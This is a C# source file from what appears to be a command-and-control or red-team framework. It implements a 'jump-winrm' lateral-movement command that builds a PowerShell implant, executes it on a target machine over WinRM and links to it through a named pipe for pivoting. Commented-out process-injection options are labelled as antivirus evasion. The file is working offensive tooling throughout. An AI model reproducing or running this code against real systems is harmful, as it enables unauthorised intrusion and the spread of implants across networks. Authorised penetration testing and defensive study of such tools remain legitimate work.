using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Common.AgentCommands.Composite;
using Common.CommandLine.Core;
using Common.Models;
using Common.Payload;
using Shared;

namespace Common.AgentCommands.Custom
{
    public class JumpWinRMCommandOptions : CommandOption
    {
        [Argument("target", "Target where the service will be started", 0)]
        public string Target { get; set; }
        [Option("v", "verbose", "Show details of the command execution.")]
        public bool verbose { get; set; }

        [Option("n", "pipe", "Name of the pipe used to pivot.", DefaultValue = "jmp")]
        public string pipe { get; set; }

        [Option("f", "file", "FileName of payload.")]
        public string file { get; set; }

        [Option("p", "path", "Name of the folder to upload the payload.", DefaultValue = "ADMIN$")]
        public string path { get; set; }

       /* [CommandOption("-i", "--inject", "If the payload should be an injector")]
        public bool inject { get; set; }

        [CommandOption("-id", "--injectDelay", "Delay before injection (AV evasion)", 30)]
        public int injectDelay { get; set; }

        [CommandOption("-ip", "--injectProcess", "Process path used for injection", null)]
        public string injectProcess { get; set; }*/

        [Option("x86", "x86", "Generate a x86 architecture executable")]
        public bool x86 { get; set; }
    }

    [Command("jump-winrm", "Lateral Movement using WinRM", Category = AgentCommandCategories.Composite)]
    public class JumpWinRMCommand : AgentCompositeCommand<JumpWinRMCommandOptions>
    {
        protected override async Task<bool> Run(AgentCommandContext context, JumpWinRMCommandOptions options)
        {
            var endpoint = ConnexionUrl.FromString($"pipe://*:{options.pipe}");
            var payloadOptions = new ImplantConfig()
            {
                StoreImplant = false,
                Architecture =  options.x86 ? ImplantArchitecture.x86 : ImplantArchitecture.x64,
                Endpoint = endpoint,
                IsDebug = false,
                IsVerbose = options.verbose,
                Type = ImplantType.PowerShell,
                //InjectionDelay =  options.injectDelay,
                //IsInjected = options.inject,
                //InjectionProcess = options.injectProcess
            };

            //if (!string.IsNullOrEmpty(options.injectProcess))
            //    payloadOptions.InjectionProcess = options.injectProcess;

            context.WriteInfo($"[>] Generating Implant!");
            var implant = await context.GeneratePayload(payloadOptions);
            if (implant == null)
            {
                context.WriteError($"[X] Generation Failed!");
                return false;
            }
            else
                context.WriteSuccess($"[+] Generation succeed!");


            context.WriteInfo($"[>] Preparing Agent command flow...");

            context.WinRM(options.Target, Encoding.UTF8.GetString(Convert.FromBase64String(implant.Data)));

            var targetEndPoint = ConnexionUrl.FromString($"pipe://{options.Target}:{options.pipe}");
            context.Echo($"[>] Linking to {targetEndPoint}");
            context.Link(targetEndPoint);

            context.Echo($"[*] Execution done!");
            context.Echo(Environment.NewLine);


            return true;
        }
    }
}
